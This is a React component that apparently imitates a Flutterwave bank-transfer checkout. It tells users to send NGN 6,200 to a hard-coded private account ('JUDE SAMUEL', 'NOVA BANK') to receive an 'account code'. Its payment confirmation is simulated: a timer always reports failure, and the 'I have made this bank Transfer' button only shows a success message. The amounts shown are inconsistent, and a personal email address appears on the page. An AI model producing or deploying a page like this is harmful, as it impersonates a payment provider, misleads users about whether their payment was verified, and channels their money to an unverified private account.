
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Copy, Check, X } from "lucide-react";
import { toast } from "sonner";
import { Skeleton } from "@/components/ui/skeleton";

const FlutterwaveConfirmation: React.FC = () => {
  const navigate = useNavigate();
  const [paymentStatus, setPaymentStatus] = useState<"loading" | "failed" | "none">("none");
  
  useEffect(() => {
    // Simulate loading and then failure after 3 seconds
    if (paymentStatus === "none") {
      setPaymentStatus("loading");
      const timer = setTimeout(() => {
        setPaymentStatus("failed");
      }, 3000);
      
      return () => clearTimeout(timer);
    }
  }, []);
  
  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${type} copied to clipboard`);
  };
  
  const handlePaymentConfirm = () => {
    toast.success("Payment confirmation sent!");
    navigate("/dashboard");
  };

  const handleRecheck = () => {
    setPaymentStatus("loading");
    setTimeout(() => {
      setPaymentStatus("failed");
    }, 3000);
  };
  
  if (paymentStatus === "loading") {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="bg-gray-200 p-4 flex justify-between items-center">
          <h1 className="text-xl font-bold">Bank Transfer</h1>
          <button 
            onClick={() => navigate(-1)}
            className="text-red-500 font-medium"
          >
            Cancel
          </button>
        </div>
        
        <div className="p-4 flex-1">
          <div className="flex justify-between items-center my-6">
            <div className="w-12 h-12 rounded-full bg-blue-800 flex items-center justify-center">
              <span className="text-white">🔄</span>
            </div>
            <div className="text-right">
              <h2 className="text-2xl font-bold">NGN 6,500</h2>
              <p className="text-sm text-gray-500">chukwuemekajames562@gmail.com</p>
            </div>
          </div>
          
          <p className="text-center text-lg font-medium my-8">
            Proceed to your bank app to complete this Transfer
          </p>
          
          <div className="flex flex-col items-center justify-center flex-1 mt-20">
            <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-yellow-500 mb-8"></div>
            <p className="text-xl font-medium">Wait while we confirm your payment...</p>
          </div>
          
          <div className="mt-10">
            <div className="bg-gray-100 p-4 rounded-lg my-2 flex items-center justify-between">
              <p>Payment Made</p>
              <Check size={24} className="text-green-500" />
            </div>
            
            <div className="bg-gray-100 p-4 rounded-lg my-2 flex items-center justify-between">
              <p>Confirming Payment</p>
              <div className="w-6 h-6 rounded-full bg-yellow-500"></div>
            </div>
          </div>
        </div>
      </div>
    );
  }
  
  if (paymentStatus === "failed") {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="bg-gray-200 p-4 flex justify-between items-center">
          <h1 className="text-xl font-bold">Bank Transfer</h1>
          <button 
            onClick={() => navigate(-1)}
            className="text-red-500 font-medium"
          >
            Cancel
          </button>
        </div>
        
        <div className="p-4 flex-1">
          <div className="flex justify-between items-center my-6">
            <div className="w-12 h-12 rounded-full bg-blue-800 flex items-center justify-center">
              <span className="text-white">🔄</span>
            </div>
            <div className="text-right">
              <h2 className="text-2xl font-bold">NGN 6,500</h2>
              <p className="text-sm text-gray-500">chukwuemekajames562@gmail.com</p>
            </div>
          </div>
          
          <p className="text-center text-lg font-medium my-8">
            Proceed to your bank app to complete this Transfer
          </p>
          
          <div className="mt-20 text-center">
            <p className="text-xl mb-4">Payment not confirmed, need help? contact email:</p>
            <a href="mailto:support@example.com" className="text-blue-600 underline">here</a>
            
            <button 
              onClick={handleRecheck}
              className="w-full bg-green-700 text-white py-3 rounded-md mt-6"
            >
              Re-check
            </button>
          </div>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen bg-gray-100">
      <div className="bg-gray-200 p-4 flex justify-between items-center">
        <h1 className="text-xl font-bold">Bank Transfer</h1>
        <button 
          onClick={() => navigate(-1)}
          className="text-red-500 font-medium"
        >
          Cancel
        </button>
      </div>
      
      <div className="p-4">
        <div className="flex justify-between items-center my-6">
          <div className="w-12 h-12 rounded-full bg-blue-800 flex items-center justify-center">
            <span className="text-white">🔄</span>
          </div>
          <div className="text-right">
            <h2 className="text-2xl font-bold">NGN 6,200</h2>
            <p className="text-sm text-gray-500">chukwuemekajames562@gmail.com</p>
          </div>
        </div>
        
        <p className="text-center text-lg font-medium my-6">
          Proceed to your bank app to complete this Transfer
        </p>
        
        <div className="bg-gray-50 border rounded-lg p-4 mb-6">
          <div className="mb-4">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600">Amount</p>
                <p className="text-xl font-bold">NGN 6200</p>
              </div>
              <button 
                onClick={() => handleCopy("6200", "Amount")}
                className="bg-yellow-500 text-white px-4 py-2 rounded"
              >
                Copy
              </button>
            </div>
          </div>
          
          <div className="mb-4">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600">Account Number</p>
                <p className="text-xl font-bold">1703005963</p>
              </div>
              <button 
                onClick={() => handleCopy("1703005963", "Account Number")}
                className="bg-yellow-500 text-white px-4 py-2 rounded"
              >
                Copy
              </button>
            </div>
          </div>
          
          <div className="mb-4">
            <div>
              <p className="text-gray-600">Bank Name</p>
              <p className="text-xl font-bold">NOVA BANK</p>
            </div>
          </div>
          
          <div>
            <div>
              <p className="text-gray-600">Account Name</p>
              <p className="text-xl font-bold">JUDE SAMUEL</p>
            </div>
          </div>
        </div>
        
        <div className="bg-gray-50 border rounded-lg p-4 mb-6">
          <p className="text-center mb-4">
            Pay to this specific account and get your account your account code
          </p>
          
          <button
            onClick={handlePaymentConfirm}
            className="w-full bg-yellow-500 text-black text-center py-4 rounded font-bold"
          >
            I have made this bank Transfer
          </button>
        </div>
      </div>
    </div>
  );
};

export default FlutterwaveConfirmation;
